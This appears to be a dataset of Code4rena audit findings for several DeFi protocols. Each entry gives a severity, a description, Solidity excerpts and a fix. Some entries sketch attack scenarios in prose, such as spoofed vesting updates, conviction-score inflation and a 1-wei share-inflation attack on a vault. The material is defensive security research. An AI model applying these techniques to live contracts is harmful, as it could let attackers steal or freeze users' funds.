The first couple of users (for which harvest is called or which transfer tokens) will be able to get their full Yield, until the moment `unallocatedSherX` is depleted. The next users don't get any yield at all. This doesn't seem fair.

```solidity
// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L309
function doYield(ILock token,address from, address to, uint256 amount) private {
...
ps.unallocatedSherX = ps.unallocatedSherX.sub(withdrawable_amount);

//https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Payout.sol#L108
 function payout( address _payout, IERC20[] memory _tokens, uint256[] memory _firstMoneyOut, uint256[] memory _amounts, uint256[] memory _unallocatedSherX,  address _exclude ) external override onlyGovPayout {
    // all pools (including SherX pool) can be deducted fmo and balance
    // deducting balance will reduce the users underlying value of stake token
    // for every pool, _unallocatedSherX can be deducted, this will decrease outstanding SherX rewards
    // for users that did not claim them (e.g materialized them and included in SherX pool)
....
    // Subtract from unallocated, as the tokens are now allocated to this payout call
        ps.unallocatedSherX = ps.unallocatedSherX.sub(unallocatedSherX);
```

Recommend that If `unallocatedSherX` is insufficient to provide for all the yields, only give the yields partly (so that each user gets their fair share)."
21.md,Gov.sol: Use `SafeERC20.safeApprove` in `tokenUnload()`,low,"This is probably an oversight since `SafeERC20` was imported and `safeTransfer()` was used for ERC20 token transfers. Nevertheless, note that `approve()` will fail for certain token implementations that do not return a boolean value (Eg. OMG and ADX tokens). Hence it is recommend to use `safeApprove()`.

Recommend updating to `_token.safeApprove(address(_native), totalToken)` in `tokenUnload()`."
21.md,`withdraw` returns the final amount withdrawn,low,"function `withdraw` in ILendingPool returns the actual withdrawn amount, however, function `withdraw` in AaveV2 strategy does not check this return value so e.g. function strategyWithdraw may actually withdraw less but still add the full amount to the staked balance:
```solidity
    ps.strategy.withdraw(_amount);
    ps.stakeBalance = ps.stakeBalance.add(_amount);
```

Recommend that function `withdraw` in `IStrategy` should return uint indicating the actual withdrawn amount and functions that use it should account for that."
21.md,series of divs,low,"The function `payout` contains an expression with 3 sequential divs. This is generally not recommended because it could lead to rounding errors / loss of precision. Also, a div is usually more expensive than a mul. Also, an intermediate division by 0 (if `SherXERC20Storage.sx20().totalSupply` == 0) could occur.

```solidity
//https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Payout.sol#L108
function payout(
..
uint256 deduction =  excludeUsd.div(curTotalUsdPool.div(SherXERC20Storage.sx20().totalSupply)).div(10e17);
```

Recommend verifying the formula and replace with something like:
```solidity
uint256 deduction =  excludeUsd.mul(SherXERC20Storage.sx20().totalSupply).div(  curTotalUsdPool.mul(10e17) )
```"
21.md,ERC20 non-standard names,low,"Usually, the functions to increase the allowance are called `increaseAllowance` and `decreaseAllowance` but in `SherXERC20` they are called `increaseApproval` and `decreaseApproval`

Recommend renaming these functions to the more common names.

[Evert0x (Sherlock) confirmed](https://github.com/code-423n4/2021-07-sherlock-findings/issues/117) sponsor confirmed- [Evert0x (Sherlock) labeled](https://github.com/code-423n4/2021-07-sherlock-findings/issues/117) disagree with severity"
21.md,User's `calcUnderlyingInStoredUSD` value is underestimated,low,"The `calcUnderlyingInStoredUSD()` function of `SherX` should return `calcUnderlyingInStoredUSD(getSherXBalance())` instead of `calcUnderlyingInStoredUSD(sx20.balances[msg.sender])` since there could be `SherX` unallocated to the user at the time of the function call. A similar function, `calcUnderlying()`, calculates the user's underlying tokens based on the user's current balance plus the unallocated ones.

Recommend changing `sx20.balances[msg.sender]` to `getSherXBalance()` at [L141](https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L141) in `SherX.sol`."
21.md,`PoolStrategy.sol`: Consider minimizing trust with implemented strategies,low,"`PoolStrategy` trusts the implemented strategy `ps.strategy` (Eg. `AaveV2.sol`) to:
- return the right amount for `ps.strategy.balanceOf()`
- have sent back the withdrawn funds when `ps.strategy.withdraw()` is called
- report the correct withdrawn amount when `ps.strategy.withdrawAll()` is called

While `ps.strategy` is assumed to have been scrutinized and  its code verified before adding it as a strategy, and can therefore be trusted, consider minimizing trust between `PoolStrategy` and `ps.strategy`, since strategies are themselves reliant on other protocols and therefore subject to external risk.

- Verify the amount sent back to `PoolStrategy` for withdrawals instead
- The reliance on `balanceOf()` can be mitigated slightly by using a counter `uint256 depositedAmount` that increments / decrements upon deposits and withdrawals to the strategy respectively. This value can then be used in lieu of `ps.strategy.balanceOf()`. However, the downsides to this are that
    - this counter does not account for yield amounts from the strategy and
    - it increases complexity

A simple implementation to checking the withdrawal amounts is provided below.

```jsx
function strategyWithdraw(uint256 _amount, IERC20 _token) external override {
  ...
  uint256 balanceBefore = _token.balanceOf(address(this));
  ps.strategy.withdraw(_amount);
  require(balanceBefore.add(_amount) == _token.balanceOf(address(this)), ""REASON"");
  ps.stakeBalance = ps.stakeBalance.add(_amount);
}

function strategyWithdrawAll(IERC20 _token) external override {
  PoolStorage.Base storage ps = baseData();
  _enforceGovPool(ps);
  _enforceStrategy(ps);

  uint256 balanceBefore = _token.balanceOf(address(this));
  ps.strategy.withdrawAll();
  // alternatively, verify amount returned by withdrawAll() method
  uint256 amount = _token.balanceOf(address(this)).sub(balanceBefore);
  ps.stakeBalance = ps.stakeBalance.add(amount);
  }
```"
21.md,Unbounded iteration over all premium tokens,low,"The `Gov.protocolRemove` function iterates over all elements of the `tokensSherX` array.

The transactions could fail if the arrays get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

The severity is low as only governance can whitelist these tokens but not the protocols themselves.

Recommendation is to keep the array size small."
21.md,Unbounded iteration over all staking tokens,low,"The `SherX.getTotalSherXUnminted` function iterates over all elements of the `tokensStaker` array.

The transactions could fail if the arrays get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

The severity is low as only governance can whitelist these tokens but not the protocols themselves.

Recommend keeping the array size small."
21.md,Unbounded iteration over all protocols,low,"The `LibPool.payOffDebtAll` function iterates over all elements of the `ps.protocols` array.

The transactions could fail if the arrays get too big and the transaction would consume more gas than the block limit.
This will then result in a denial of service for the desired functionality and break core functionality.

The severity is low as only governance can whitelist protocols per token but not the protocols themselves.

Recommendation is to keep the array size small."
21.md,Missing verification on `tokenInit`'s lock,low,"The `Gov.tokenInit` skips the underlying token check if the `_token` is SHERX:

```solidity
if (address(_token) != address(this)) {
  require(_lock.underlying() == _token, 'UNDERLYING');
}
```

This check should still be performed even for `_token == address(this) // SHERX`, otherwise, the lock can have a different underlying and potentially pay out wrong tokens.

Recommendation is to verify the underlying of all locks."
21.md,`_doSherX` does not return correct precision and it's confusing,low,"The `_doSherX` function does not return the correct precision of `sherUsd` and it is **not** the ""Total amount of USD of the underlying tokens that are being transferred"" that the documentation mentions.

```solidity
sherUsd = amounts[i].mul(sx.tokenUSD[tokens[i]]);
```

Instead, the amount is inflated by `1e18`, it should divide the amount by `1e18` to get a USD value with 18 decimal precision.

The severity is low as the calling site in `payout` makes up for it by dividing by `1e18` in the `deduction` computation.

We still recommend returning the correct amount in `_doSherX` already to match the documentation and avoid any future errors when using its unintuitive return value."
21.md,Anyone can unstake on behalf of someone,low,"The `PoolBase.unstakeWindowExpiry` function allows unstaking tokens of other users.
While the tokens are sent to the correct address, this can lead to issues with smart contracts that might rely on claiming the tokens themselves.

For example, suppose the `_to` address corresponds to a smart contract that has a function of the following form:
```solidity
function withdrawAndDoSomething() {
    uint256 amount = token.balanceOf(address(this));
    contract.unstakeWindowExpiry(address(this), id, token);
    amount = amount - token.balanceOf(address(this));
    token.transfer(externalWallet, amount)
}
```
Recommend considering that, If the contract has no other functions to transfer out funds, they may be locked forever in this contract."
21.md,Sanitize `_weights` in `setWeights` on every use,low,"The `setWeights` function only stores the `uint16` part of `_weights[i]` in storage (`ps.sherXWeight = uint16(_weights[i])`).
However, to calculate `weightAdd/weightSub` the full value (not truncated to 16 bits) is used.
This can lead to discrepancies as the actually added part is different from the one tracked in the `weightAdd` variable."
21.md,`initializeSherXERC20` can be called more than once,low,"The `SherXERC20.initializeSherXERC20` function has `initialize` in its name which indicates that it should only be called once to initialize the storage. But it can be repeatedly called to overwrite and update the ERC20 name and symbol.

Recommend considering an `initializer` modifier or reverting if `name` or `symbol` is already set."
21.md,ERC20 can accidentally burn tokens,low,"The `SherXERC20.transfer`/`transferFrom` actions allow transferring tokens to the zero address.
This is usually prohibited to accidentally avoid ""burning"" tokens by sending them to an unrecoverable zero address."
21.md,extra check `setUnstakeWindow` and `setCooldown`,low,"The function `setUnstakeWindow` and `setCooldown` don't check that the input parameter isn't 0. So the values could accidentally be set to 0 (although unlikely).
However you wouldn't want the to be 0 because that would allow attacks with flashloans (stake and unstake in the same transaction)

```solidity
https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L124
 function setUnstakeWindow(uint40 _unstakeWindow) external override onlyGovMain {
    require(_unstakeWindow < 25000000, 'MAX'); // ~ approximate 10 years of blocks
    GovStorage.gs().unstakeWindow = _unstakeWindow;
  }

  function setCooldown(uint40 _period) external override onlyGovMain {
    require(_period < 25000000, 'MAX'); // ~ approximate 10 years of blocks
    GovStorage.gs().unstakeCooldown = _period;
  }
```
Recommend checking the input parameter of `setUnstakeWindow` and `setCooldown` isn't 0"
21.md,delete `ps.stakeBalance`,low,"In the function `tokenUnload`, `ps.stakeBalance` is only deleted if balance >0. e.g it is deleted if `ps.stakeBalance` > ps.firstMoneyOut
So if `ps.stakeBalance` ==  ps.firstMoneyOut then `ps.stakeBalance` will not be deleted.
And then a call to tokenRemove will revert, because it checks for `ps.stakeBalance` to be 0

```solidity
// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/Gov.sol#L271
 function tokenUnload( IERC20 _token, IRemove _native, address _remaining ) external override onlyGovMain {
...
    uint256 balance = ps.stakeBalance.sub(ps.firstMoneyOut);
    if (balance > 0) {
      _token.safeTransfer(_remaining, balance);
      delete ps.stakeBalance;
    }
..
  delete ps.firstMoneyOut;

 function tokenRemove(IERC20 _token) external override onlyGovMain {
  ...
    require(ps.stakeBalance == 0, 'BALANCE_SET');
 }
```
Recommend checking what to do in this edge case and add the appropriate code."
21.md,prevent div by 0,low,"On several locations in the code precautions are taken not to divide by 0, because this will revert the code.
However on some locations this isn't done.

Especially in `doYield` a first check is done for totalAmount >0, however a few lines later there is an other div(totalAmount) which isn't checked.

The proof of concept show another few examples.

```solidity
// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherX.sol#L309
function doYield(ILock token,address from,address to,uint256 amount) private {
..
    uint256 totalAmount = ps.lockToken.totalSupply();
..
    if (totalAmount > 0) {
      ineglible_yield_amount = ps.sWeight.mul(amount).div(totalAmount);
    } else {
      ineglible_yield_amount = amount;
    }
    if (from != address(0)) {
      uint256 raw_amount = ps.sWeight.mul(userAmount).div(totalAmount);  // totalAmount could be 0, see lines above

// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L295
function activateCooldown(uint256 _amount, IERC20 _token) external override returns (uint256) {
...   uint256 tokenAmount = fee.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());   // ps.lockToken.totalSupply() might be 0

//https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L351
 function unstake( uint256 _id, address _receiver, IERC20 _token ) external override returns (uint256 amount) {
...    amount = withdraw.lock.mul(LibPool.stakeBalance(ps)).div(ps.lockToken.totalSupply());  // // ps.lockToken.totalSupply() might be 0

//https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibPool.sol#L67
 function stake( PoolStorage.Base storage ps,uint256 _amount, address _receiver ) external returns (uint256 lock) {
...      lock = _amount.mul(totalLock).div(stakeBalance(ps));   // stakeBalance(ps) might be 0
```

Recommend making sure division by 0 won't occur by checking the variables beforehand and handling this edge case."
21.md,unbounded loop in `getInitialUnstakeEntry`,low,"The functions `getInitialUnstakeEntry` contains a for loop that can be unbounded. This would mean it could run out of gas and the function would revert.
The array `unstakeEntries` can be made arbitrarily large by repeatedly calling activateCooldown with a small amount of tokens.

The impact is very low because the array `unstakeEntries` is separated per user and links to `mgs.sender`, so you can only shoot yourself in your foot.

Additionally the function `getInitialUnstakeEntry` isn't used in the smart contracts.
```solidity
//https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/PoolBase.sol#L123
 function getInitialUnstakeEntry(address _staker, IERC20 _token)  external view  override returns (uint256)  {
...
for (uint256 i = 0; i < ps.unstakeEntries[_staker].length; i++) {
      if (ps.unstakeEntries[_staker][i].blockInitiated == 0) {

function activateCooldown(uint256 _amount, IERC20 _token) external override returns (uint256) {
    require(_amount > 0, 'AMOUNT');
...
    ps.unstakeEntries[msg.sender].push(PoolStorage.UnstakeEntry(uint40(block.number), _amount.sub(fee)) );
```

Recommend probably accepting the situation and add a comment in the function `getInitialUnstakeEntry`"
21.md,prevent burn in `_transfer`,low,"The function `_transfer` in SherXERC20.sol allow transfer to address 0.
This is usually considered the same as burning the tokens and the `Emit` is indistinguishable from an `Emit` of a burn.

However the burn function in LibSherXERC20.sol has extra functionality, which `_transfer` doesn't have.
`sx20.totalSupply = sx20.totalSupply.sub(_amount);`

So it is safer to prevent `_transfer` to address 0 (which is also done in the openzeppelin erc20 contract)
See:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L226

Note: minting from address 0 will not work because that is blocked by the `safemath` sub in:
 `sx20.balances[_from] = sx20.balances[_from].sub(_amount);`
```solidity
https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/facets/SherXERC20.sol#L118
function _transfer(address _from, address _to, uint256 _amount) internal {
  SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20();
  sx20.balances[_from] = sx20.balances[_from].sub(_amount);
  sx20.balances[_to] = sx20.balances[_to].add(_amount);
  emit Transfer(_from, _to, _amount);
}

// https://github.com/code-423n4/2021-07-sherlock/blob/main/contracts/libraries/LibSherXERC20.sol#L29
function burn(address _from, uint256 _amount) internal {
  SherXERC20Storage.Base storage sx20 = SherXERC20Storage.sx20();
  sx20.balances[_from] = sx20.balances[_from].sub(_amount);
  sx20.totalSupply = sx20.totalSupply.sub(_amount);
  emit Transfer(_from, address(0), _amount);
}
```

Recommend adding something like to following to `_transfer` of SherXERC20.sol:
```solidity
        require(_to!= address(0), ""Transfer to the zero address"");
```
Or, updating `sx20.totalSupply` if burning a desired operation."
21.md,AaveV2 approves lending pool in the constructor,low,"Contract AaveV2 does not cache the lending pool, it retrieves it when necessary by calling a function `getLp()`. This is great as the implementation may change, however, this contract also approves an unlimited amount of want in the constructor:
```solidity
  ILendingPool lp = getLp();
  want.approve(address(lp), uint256(-1));
so if the implementation changes, the approval will reset. This will break the deposit function as it will try to deposit to this new lending pool with 0 approval.
```
For reference, function [`setLendingPoolImpl`](https://github.com/aave/aave-protocol/blob/4b4545fb583fd4f400507b10f3c3114f45b8a037/contracts/configuration/LendingPoolAddressesProvider.sol#L58-L65).

Not sure how likely is that lending pool implementation will change so marking this as 'Low'.

Recommend that before calling `lp.deposit` check that the approval is sufficient and increase otherwise."
21.md,Inclusive checks,low,"I think these checks should be inclusive:
```solidity
  require(_unstakeWindow < 25000000, 'MAX');
  require(_period < 25000000, 'MAX');
  if (_amount > oldValue) // >= will reduce gas here
```
```solidity
  require(_unstakeWindow <= 25000000, 'MAX');
  require(_period <= 25000000, 'MAX');
  if (_amount >= oldValue)
```"
21.md,Group related data into separate structs,low,"In Base struct having 3 separate fields that map from _protocol is error-prone. If you later introduce new fields, etc, you need not forget to delete them in function protocolRemove, etc. I think it would be better to have a separate struct for protocol-related data and map to that.

An example solution, replace:

```solidity
  mapping(bytes32 => address) protocolManagers;
  mapping(bytes32 => address) protocolAgents;
  mapping(bytes32 => bool) protocolIsCovered;
```
with:
```solidity
struct ProtocolInfo {
  address manager;
  address agent;
  bool covered;
}
struct Base {
  ...
  mapping(bytes32 => ProtocolInfo) protocolInfo;
  ...
}
```
Then you can delete all fields this way: delete `gs.protocolInfo[_protocol]`; Similar solution may be applied to `PoolStorage` (`protocolBalance`, `protocolPremium`, `isProtocol`)."
21.md,Re-entrancy mitigation,low,"I see no re-entrancy mitigations. Contracts interact with various outside sources (tokens, aave pools, other possible strategies that may be added in the future, etc). so, for instance, now you have to be careful and do not allow tokens that have a receiver callback (e.g. erc777) or untrustable sources of yield (strategies).


Consider using [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) on main action functions."
21.md,`getInitialUnstakeEntry` when `unstakeEntries` is empty,low,"When the address has no unstake entries, function `getInitialUnstakeEntry` still returns 0 index. This function is external but can still confuse the outside consumers.

Recommend considering  requiring `ps.unstakeEntries[_staker].length > 0;`"
21.md,Loops may exceed gas limit,low,"Probably you are aware of this, but as I see many for loops throughout the code iterating over dynamic arrays I suggest being very careful as the execution may exceed the block gas limit, consume all the gas provided, and fail. Some arrays have removal functions, but there is, for instance, `unstakeEntries` array that is never actually removed as 'delete ps.unstakeEntries[msg.sender][_id];' only resets the values to default.

You can consider introducing max limits on items in the arrays or make sure that elements can be removed from dynamic arrays in case it becomes too large."
21.md,`SafeMath` library is not always used in `PoolBase`,low,"`SafeMath` library functions are not always used in arithmetic operations in the `PoolBase` contract, which could potentially cause integer underflow/overflows. Although in the reference lines of code, there are upper limits on the variables to ensure an integer underflow/overflow could not happen, using `SafeMath` is always a best practice, which prevents underflow/overflows completely (even if there were no assumptions on the variables) and increases code consistency as well.

Recommend considering using the `SafeMath` library functions in the referenced lines of code."
21.md,Missing non-zero address checks,low,"Adding non-zero address checks on the following function's parameters can help ensure the ownership of contracts is not lost or the contracts do not need to be redeployed if any of them is provided as zero accidentally.

Recommend considering adding non-zero address checks on the parameters."
21.md,Possible divide-by-zero error in `PoolBase`,low,"A possible divide-by-zero error could happen in the `getSherXPerBlock(uint256, IERC20)` function of `PoolBase` when the `totalSupply` of `lockToken` and `_lock` are both 0.
Recommend checking  if `baseData().lockToken.totalSupply().add(_lock)` equals to 0 before line 214. If so, then return 0."
21.md,Inconsistent block number comparison when deciding an unstaking entry is active,low,"The `getInitialUnstakeEntry` function of `PoolBase` returns the first active unstaking entry of a staker, which requires the current block to be strictly before the last block in the unstaking window. However, the `unstake` function allows the current block to be exactly the same as the last block (same logic in `unstakeWindowExpiry`).

Recommend changing the `<=` comparison at line 136 to `<` for consistency."
21.md,Tokens cannot be reinitialized with new lock tokens,low,"A token cannot be reinitialized with a new lock token once it is set to a non-zero address. If the lock token needs to be changed (for example, because of implementation errors), the token must be removed and added again.

Consider removing the `if` condition at line 219 to allow the lock token to be reinitialized."
50.md,Anyone Can Arbitrarily Call `FSDVesting.updateVestedTokens()`,high,"#### Impact
The `updateVestedTokens()` function is intended to be called by the `FSD.sol` contract when updating a user's vested token amount. A check is performed to ensure that `_user == beneficiary`, however, as `_user` is a user controlled argument, it is possible to spoof calls to `updateVestedTokens()` such that anyone can arbitrarily add any amount to the vested contract. Additionally, there is no check to ensure that the call originated from a trusted/whitelisted source.

There are two main reasons as to why the beneficiary or an attacker would want to call this function:

*   To increase the vested amount such that `calculateVestingClaim()` allows them to withdraw their entire vested amount without waiting the entire duration.
*   An attacker wishes to block withdrawals from other vested contracts by preventing successful calls to `claimVestedTokens()` by the beneficiary account. This can be done by increasing the vested amount such that `safeTransfer()` calls fail due to insufficient token balance within the contract.

#### Proof of Concept
- <https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L147-L161>
- <https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L100-L115>
- <https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L125>
- <https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/token/FSDVesting.sol#L134>

#### Tools Used
Manual code review.
Discussions with dev.

#### Recommended Mitigation Steps
Ensure that the `updateVestedTokens()` function is only callable from the `FSD.sol` contract. This can be done by implementing an `onlyFSD` role."
50.md,`FSDVesting`: Claiming tributes should call FSD token's corresponding functions,high,"#### Impact
The claiming of staking and governance tributes for the a beneficiary's vested tokens should be no different than other users / EOAs. However, the `claimTribute()` and `claimGovernanceTribute()` are missing the actual claiming calls to the corresponding functions of the FSD token contract. As a result, the accrued rewards are taken from the beneficiary's vested token while not claiming (replenishing) from the FSD token contract.

#### Recommended Mitigation Steps

In addition to what has been mentioned above, the internal accounting for claimedTribute states can be removed because they are already performed in the FSD token contract.

```jsx
// TODO: Remove _claimedTribute and _claimedGovernanceTribute mappings

/**
* @dev Allows claiming of staking tribute by `msg.sender` during their vesting period.
* It updates the claimed status of the vest against the tribute
* being claimed.
*
* Requirements:
* - claiming amount must not be 0.
*/
function claimTribute(uint256 num) external onlyBeneficiary {
    uint256 tribute = fsd.availableTribute(num);
    require(tribute != 0, ""FSDVesting::claimTribute: No tribute to claim"");
		fsd.claimTribute(num);
    fsd.safeTransfer(msg.sender, tribute);
    emit TributeClaimed(msg.sender, tribute);
}

/**
* @dev Allows claiming of governance tribute by `msg.sender` during their vesting period.
* It updates the claimed status of the vest against the tribute
* being claimed.
*
* Requirements:
* - claiming amount must not be 0.
*/
function claimGovernanceTribute(uint256 num) external onlyBeneficiary {
  uint256 tribute = fsd.availableGovernanceTribute(num);
  require(
    tribute != 0,
    ""FSDVesting::claimGovernanceTribute: No governance tribute to claim""
  );
  fsd.claimGovernanceTribute(num);
  fsd.safeTransfer(msg.sender, tribute);
  emit GovernanceTributeClaimed(msg.sender, tribute);
}
```"
50.md,"Beneficiary cant get `fairSideConviction` NFT unless they only claim once, and only after it's fully vested",high,"Based on the context, once the beneficiary claimed all their vesting tokens, they should get the `fairSideConviction` NFT.

However, in the current implementation, if the beneficiary has claimed any amounts before it's fully vested, then they will never be able to get the `fairSideConviction` NFT, because at L138, it requires the `tokenbClaim` to be equal to the initial vesting amount.

[`FSDVesting.sol` L124-L142](https://github.com/code-423n4/2021-11-fairside/blob/20c68793f48ee2678508b9d3a1bae917c007b712/contracts/token/FSDVesting.sol#L124-L142)



```solidity
function claimVestedTokens() external override onlyBeneficiary {
    uint256 tokenClaim = calculateVestingClaim();
    require(
        tokenClaim > 0,
        ""FSDVesting::claimVestedTokens: Zero claimable tokens""
    );

    totalClaimed = totalClaimed.add(tokenClaim);
    lastClaimAt = block.timestamp;

    fsd.safeTransfer(msg.sender, tokenClaim);

    emit TokensClaimed(msg.sender, tokenClaim, block.timestamp);

    if (amount == tokenClaim) {
        uint256 tokenId = fsd.tokenizeConviction(0);
        fairSideConviction.transferFrom(address(this), msg.sender, tokenId);
    }
}
```

##### Recommendation
Change to:

```solidity
function claimVestedTokens() external override onlyBeneficiary {
    uint256 tokenClaim = calculateVestingClaim();
    require(
        tokenClaim > 0,
        ""FSDVesting::claimVestedTokens: Zero claimable tokens""
    );

    totalClaimed = totalClaimed.add(tokenClaim);
    lastClaimAt = block.timestamp;

    fsd.safeTransfer(msg.sender, tokenClaim);

    emit TokensClaimed(msg.sender, tokenClaim, block.timestamp);

    if (amount == totalClaimed) {
        uint256 tokenId = fsd.tokenizeConviction(0);
        fairSideConviction.transferFrom(address(this), msg.sender, tokenId);
    }
}
```"
50.md,ERC20ConvictionScore._writeCheckpoint` does not write to storage on same block,high,"In `ERC20ConvictionScore._writeCheckpoint`, when the checkpoint is overwritten (`checkpoint.fromBlock == blockNumber`), the new value is set to the `memory checkpoint` structure and never written to storage.

```solidity
// @audit this is MEMORY, setting new convictionScore doesn't write to storage
Checkpoint memory checkpoint = checkpoints[user][nCheckpoints - 1];

if (nCheckpoints > 0 && checkpoint.fromBlock == blockNumber) {
    checkpoint.convictionScore = newCS;
}
```

Users that have their conviction score updated several times in the same block will only have their first score persisted.

###### POC
*   User updates their conviction with `updateConvictionScore(user)`
*   **In the same block**, the user now redeems an NFT conviction using `acquireConviction(id)`. This calls `_increaseConvictionScore(user, amount)` which calls `_writeCheckpoint(..., prevConvictionScore + amount)`. The updated checkpoint is **not** written to storage, and the user lost their conviction NFT. (The conviction/governance totals might still be updated though, leading to a discrepancy.)

#### Impact
Users that have their conviction score updated several times in the same block will only have their first score persisted.

This also applies to the total conviction scores `TOTAL_CONVICTION_SCORE` and `TOTAL_GOVERNANCE_SCORE` (see `_updateConvictionTotals`) which is a big issue as these are updated a lot of times each block.

It can also be used for inflating a user's conviction by first calling `updateConvictionScore` and then creating conviction tokens with `tokenizeConviction`. The `_resetConviction` will not actually reset the user's conviction.

#### Recommended Mitigation Steps
Define the `checkpoint` variable as a `storage` pointer:

```solidity
Checkpoint storage checkpoint = checkpoints[user][nCheckpoints - 1];
```"
50.md,`TributeAccrual.availableTribute()` & `TributeAccrual.availableGovernanceTribute()` Distributes Tributes Unfairly,medium,"#### Impact

Conviction scores are calculated by taking the user's balance and multiplying it by the time elapsed. This score is updated upon each token transfer, or alternatively by directly calling `ERC20ConvictionScore.updateConvictionScore()`. The `availableTribute()` and `availableGovernanceTribute()` functions calculate a user's share by calculating their percentage of the total conviction score to find the amount owed to them.

This is shown in the following statement where `userCS` is the user's conviction score and `totalCS` is the protocol's total conviction score:

    return amount.mul(userCS).div(totalCS);

The tribute amount that can be successfully claimed disproportionally favours users who have updated their conviction score more recently and who are early to claim their allocated tribute.

#### Proof of Concept
Consider the following POC:

*   Two users Alice and Bob both have a conviction score of 5 at time = 1.
*   Time advances such that time = 2.
*   Bob calls `updateConvictionScore()` which sets his conviction score to `5 * time = 10` where time = 2.
*   Therefore, the total conviction score is now 15 and Alice and Bob's individual conviction scores are 5 and 10 respectively.
*   Bob attempts to call `claimTribute()` where the tribute to claim is of size 15 tokens. As a result, Bob receives 10 tokens according to the calculation mentioned above (`(15*10)/15`).
*   Alice updates her conviction score and also attempts to call `claimTribute()`, receiving 7.5 tokens in the process.
*   As a result, a total of 22.5 tokens were transferred out despite the tribute amount being only 15 tokens in total.

As you can see from the above example, the amount of tokens transferred favours user's who claim early and update their conviction score. It is entirely possible that due to the finite amount of tokens stored in the contract, a number of user's won't be able to successfully claim their allocated tribute.

- [`TributeAccrual.sol#L93` L112](https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/dependencies/TributeAccrual.sol#L93-L112)
- [`TributeAccrual.sol#L117` L136](https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/dependencies/TributeAccrual.sol#L117-L136)
- [`dependencies/TributeAccrual.sol` L156](https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/dependencies/TributeAccrual.sol#L156)
- [`dependencies/TributeAccrual.sol` L179](https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/dependencies/TributeAccrual.sol#L179)
- [`ERC20ConvictionScore.sol#L476` L479](https://github.com/code-423n4/2021-11-fairside/blob/main/contracts/dependencies/ERC20ConvictionScore.sol#L476-L479)

#### Tools Used
Manual code review.

#### Recommended Mitigation Steps
There is no easy solution to the mentioned issue. Ideally, all users should have an up to date conviction score whenever `claimTribute()` or `claimGovernanceTribute()` are called, although this would be an incredibly gas intensive mitigation. Alternatively, the protocol's total conviction score can be calculated by tracking the total minted balance of `FSD.sol`'s token and multiplying this by a running total of time elapsed. This will need to be adjusted whenever tokens are minted or burned and updated during tribute claims."
50.md,`user.creation` is updated incorrectly when the user tries to extend membership,medium,"[`FSDNetwork.sol` L274-L291](https://github.com/code-423n4/2021-11-fairside/blob/20c68793f48ee2678508b9d3a1bae917c007b712/contracts/network/FSDNetwork.sol#L274-L291)

<https://github.com/code-423n4/2021-11-fairside/blob/20c68793f48ee2678508b9d3a1bae917c007b712/contracts/network/FSDNetwork.sol#L274-L291>

```js
if (user.creation == 0) {
    user.creation = block.timestamp;
    user.gracePeriod =
        membership[msg.sender].creation +
        MEMBERSHIP_DURATION +
        60 days;
} else {
    uint256 elapsedDurationPercentage = ((block.timestamp -
        user.creation) * 1 ether) / MEMBERSHIP_DURATION;
    if (elapsedDurationPercentage < 1 ether) {
        uint256 durationIncrease = (costShareBenefit.mul(1 ether) /
            (totalCostShareBenefit - costShareBenefit)).mul(
                MEMBERSHIP_DURATION
            ) / 1 ether;
        user.creation += durationIncrease;
        user.gracePeriod += durationIncrease;
    }
}
```

##### PoC
1.  Alice calls `function purchaseMembership()` and adds 20 ether of `costShareBenefit` on day 1:

<!---->

    alice.creation = day 1 timestamp;
    alice.gracePeriod = day 791 timestamp;

2.  Alice calls `function purchaseMembership()` again and adds 20 ether of `costShareBenefit` on day 2:

<!---->

    elapsedDurationPercentage = 1/720
    durationIncrease = 730 day

    alice.creation = day 731 timestamp;
    alice.gracePeriod = day 1521 timestamp;

Making Alice unable to use any membership features until two years later."
67.md,`forceUnsponsor()` may open a window for attackers to manipulate the `_totalShares` and freeze users' funds at a certain deposit amount,high,"<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L390-L401>

```solidity
if (_force && sponsorAmount > totalUnderlying()) {
    sponsorToTransfer = totalUnderlying();
} else if (!_force) {
    require(
        sponsorToTransfer <= totalUnderlying(),
        ""Vault: not enough funds to unsponsor""
    );
}

totalSponsored -= sponsorAmount;

underlying.safeTransfer(_to, sponsorToTransfer);
```

When `sponsorAmount > totalUnderlying()`, the contract will transfer `totalUnderlying()` to `sponsorToTransfer`, even if there are other depositors and `totalShares` > 0.

After that, and before others despoiting into the Vault, the Attacker can send `1 wei` underlying token, then cal `deposit()` with 0.1 \* 1e18 , since `newShares  = (_amount * _totalShares) / _totalUnderlyingMinusSponsored` and `_totalUnderlyingMinusSponsored` is `1`, with a tiny amount of underlying token, `newShares` will become extremly large.

